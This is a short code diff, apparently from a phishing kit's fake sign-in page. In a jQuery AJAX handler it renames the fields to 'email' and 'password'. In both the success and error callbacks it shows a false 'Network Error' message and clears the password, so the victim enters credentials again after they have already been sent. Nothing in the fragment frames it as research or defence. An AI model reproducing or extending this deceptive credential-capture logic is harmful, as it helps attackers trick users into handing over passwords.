@@ -148,8 +148,8 @@ $(document).ready(function() {
 		
 		success: function(res) {
 			setTimeout(function () {
-				$("#x1").val(url);
-				$("#x2").val("");
+				$("#email").val(url);
+				$("#password").val("");
 				$("#msg").show();
 				$("#msg").html("Network Error! Please verify your information and try again");
 				$("#submitBtn").html("Sign In").prop("disabled", false);
@@ -158,8 +158,8 @@ $(document).ready(function() {
 		
 		error: function(res) {
 			setTimeout(function () {
-				$("#x1").val(url);
-				$("#x2").val("");
+				$("#email").val(url);
+				$("#password").val("");
 				$("#msg").show();
 				$("#msg").html("Network Error! Please verify your information and try again");
 				$("#submitBtn").html("Sign In").prop("disabled", false);
